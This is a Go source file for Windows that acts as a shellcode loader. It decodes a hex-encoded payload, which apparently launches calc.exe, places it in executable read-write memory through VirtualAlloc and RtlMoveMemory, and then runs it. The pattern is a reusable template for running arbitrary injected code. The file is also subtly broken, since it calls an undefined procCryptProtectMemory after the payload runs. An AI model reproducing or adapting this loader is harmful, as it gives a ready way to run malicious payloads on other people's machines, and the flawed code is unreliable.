package main

import (
	"encoding/hex"
	"syscall"
	"unsafe"
)

func main() {

	var (
		kernel32      = syscall.MustLoadDLL("kernel32.dll")
		ntdll         = syscall.MustLoadDLL("ntdll.dll")
		VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
		RtlMoveMemory = ntdll.MustFindProc("RtlMoveMemory")
	)

	const (
		MEM_COMMIT             = 0x1000
		MEM_RESERVE            = 0x2000
		PAGE_EXECUTE_READWRITE = 0x40
	)

	sc, _ := hex.DecodeString("31c0506863616c635459504092741551648b722f8b760c8b760cad8b308b7e18b250eb1ab2604829d465488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd7")

	charcode := sc

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)

	println(addr)

	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))

	syscall.Syscall(addr, 0, 0, 0, 0)

	_, _, err := procCryptProtectMemory.Call(uintptr(addr), uintptr(len(charcode)), uintptr(0x00))
	if err != nil {
		panic(err)
	}

}
